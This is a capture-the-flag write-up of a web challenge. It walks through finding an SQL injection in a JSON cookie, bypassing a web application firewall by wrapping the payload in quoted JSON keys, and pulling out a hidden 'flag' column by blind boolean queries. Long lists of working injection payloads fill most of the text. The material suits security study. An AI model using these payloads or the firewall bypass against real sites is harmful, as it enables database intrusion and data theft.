Firewalls proved to be very useful in our hosting environment as it protects against attacks on vulnerable sites of our clients.

I'll keep it short. very short.

Simple website that let's me change my flair. It looks like this:

![Website](/assets/images/secops/screenshot.png)

So when I click *set as flair* it sets my flair to anything in there. How does it do it? It's a binded onclick event on that button:

```javascript
$('.hook-set').click(function() {
    var prefs = JSON.stringify({ flair: $(this).data('id') });
    document.cookie = 'prefs' + "=" + encodeURIComponent(prefs) + "; path=/";
    location.reload();
});
```

So after fiddling around a bit, I find that the flair with id 4 has the Name `Flag`. That's like jackpot. Easy challenge. Done. lol.

I was thinking the actual flag is in the Price. As you can see the table has 3 columns: id, name, price. Cool.

It's a pain to work with the cookie encoded, so I scripted a little nodejs tool to help me `pwn.js` to do the hard part for me so I could just try different sqli attack vectors. I didn't need much to discover there was an Web Application Firewal in place (a bit later a teammate pointed it out to me that it said so in the description lol. gotta read it more carefully next time)

The query inside I guessed looks something like this `SELECT name FROM table WHERE id = '%id';`. I played with my tool a bit:

```
node pwn.js "' or 1=1--"
node pwn.js "' or 1=1#"
node pwn.js "' or 1=1##"
node pwn.js "' or 1=1/*"
node pwn.js "' or 1=1###"
node pwn.js "' or 1=1"
node pwn.js "' or 1='1"
node pwn.js "' or 1=1'"
node pwn.js "4' or 1=1'"
node pwn.js "4' or 1''=1'"
node pwn.js "4' or '1'=1'"
node pwn.js "4' or '80'=1'"
node pwn.js "4' or 80=1'"
node pwn.js "4' or 80=80'"
node pwn.js "4' or 80=80''"
node pwn.js "4' or 80=80'''"
node pwn.js "4' or 16='0xf"
node pwn.js "4' or 16=0xf'"
node pwn.js "4' or 1='"
node pwn.js "3' or sleep(5000)='"
node pwn.js "3' or sleep(500000)='"
node pwn.js "3' or 1='"
node pwn.js "3'\"\n"
node pwn.js "3'"
node pwn.js "3' or sleep(1)=0"
node pwn.js "3' or sl/**/eep(1)=0"
node pwn.js "3' or sl/**/eep(1)='0"
node pwn.js "3' or sl/**/eep(50)='0"
node pwn.js "3' or SLeEp(50)='0"
node pwn.js "3' or SLeEp (50)='0"
node pwn.js "3' or benchmark(200000,md5(now()))='0"
node pwn.js "3' or benchmark()='0"
node pwn.js "3' or b/**/enchmark()='0"
node pwn.js "3' or md5()='0"
node pwn.js "3 or md5()=0"
node pwn.js "3' or"
node pwn.js "3' or 1=1--"
node pwn.js "3' or 1=1/*"
node pwn.js "3' or 1=1#"
```

All failures. Website was sending 500 on SQL ERROR. Otherwise, WAF was blocking the request with 403. almost every time.

Then I figured out after reading a bit on WAF on OWASP that maybe it reacts somehow to
a cookie like `{"flair":"a","flair":${JSON.stringify(flair)},"flair":"b"}`. Nope. But that pointed me on the right direction. The WAF was accepting some things when I used quotes around them. So what if quote left and right, json valid, and send it. Hopefully WAF uses a regex, not a json parser (who parses cookies for JSON?!), so maybe it's not that strict inside quotes.

We got a winner.
`{"flair":"'","flair":${JSON.stringify(flair)},"flair2":"'"}`
PS: I dont think the first flair key is necessary but I didn't test it.

So back to testing attack vectors:
```
node pwn.js "3' order by '1"
node pwn.js "3' order by '1'--#"
node pwn.js "3' order by '1'"
node pwn.js "3' order by 1"
node pwn.js "3' or 1='1"
node pwn.js "3' and 1='0"
node pwn.js "3' union all select '1"
node pwn.js "3' union sele/**/ct '1"
node pwn.js "3' u/**/nion sele/**/ct '1"
node pwn.js "3' union select '1"
```

`Union select` blocked by WAF.

```
node pwn.js "4' and length(price)<10 and 1='1"
node pwn.js "4' and length(price)<5 and 1='1"
node pwn.js "4' and length(price)<8 and 1='1"
node pwn.js "4' and length(price)<6 and 1='1"
node pwn.js "4' and length(price)<7 and 1='1"
node pwn.js "4' and length(price)=6 and 1='1"
node pwn.js "4' and left(price,2)='99' and 1='1"
node pwn.js "4' and left(price,3)='999' and 1='1"
node pwn.js "4' and left(price,4)='9999' and 1='1"
node pwn.js "4' and left(price,4)='999.' and 1='1"
node pwn.js "4' and left(price,5)='999.' and 1='1"
node pwn.js "4' and left(price,5)='999.9' and 1='1"
node pwn.js "4' and left(price,7)='999.99' and 1='1"
node pwn.js "4' and left(price,6)='999.99' and 1='1"
node pwn.js "4' and (sel/**/ect 1 from information_schema)='999.99' and 1='1"
node pwn.js "4' and (sel/**/ect 1 from informat/**/ion_schema)='999.99' and 1='1"
node pwn.js "4' and (union select 1 from informat/**/ion_schema)='999.99' and 1='1"
```

The flag wasn't in `price` :(. also `information_schema` blocked.

```
node pwn.js "4' order by '1"
node pwn.js "4' and length(flag)='999.99' and 1='1"
node pwn.js "4' and length(flag)>0 and 1='1"
node pwn.js "4' and length(flag)>10 and 1='1"
node pwn.js "4' and length(flag)<100 and 1='1"
node pwn.js "4' and length(flag)<50 and 1='1"
node pwn.js "4' and length(flag)<25 and 1='1"
node pwn.js "4' and length(flag)<10 and 1='1"
node pwn.js "4' and length(flag)<64 and 1='1"
node pwn.js "4' and length(flag)=64 and 1='1"
node pwn.js "4' and length(flag)=70 and 1='1"
```

But on a lucky guess of a teammate I found out there was another column named `flag` and it had the right length (70 chars). Jackpot!

After that I coded a binary search into my script and waited a bit to get the flag. BLIND. The code is in `pwn.js`. To run it you need `nodejs`
```
npm install
npm pwn.js
```
